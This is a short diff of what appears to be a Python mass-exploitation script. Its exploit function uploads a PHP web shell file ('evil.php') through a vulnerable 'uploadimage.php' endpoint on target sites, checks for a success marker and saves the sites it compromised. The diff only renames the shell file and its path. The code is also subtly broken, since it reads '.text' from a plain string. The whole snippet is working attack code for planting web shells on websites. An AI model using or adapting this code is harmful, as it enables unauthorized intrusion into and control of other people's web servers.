@@ -48,12 +48,12 @@ def exploit(sites):
 			print(green("[+] Website or Modules Maybe vuln => {}".format(sites)))
 			print(blue("[?] Try to upload shell ..."))
 			time.sleep(1)
-			files = {'userfile' : open('../shell/dt.php', 'rb')}
+			files = {'userfile' : open('../shell/evil.php', 'rb')}
 			url = sites
 			r = requests.post(url, files=files, timeout=5)
 			if "success" in r.content.decode('utf-8'):
 				print(blue("[?] Cek shell ..."))
-				shell = url.replace("uploadimage.php", "")+"slides/up.php"
+				shell = url.replace("uploadimage.php", "")+"slides/evil.php"
 				if 'PWDxD3pTeam' in shell.text:
 					save(shell)
 					print(green("[+] Success upload shell => {}".format(shell)))
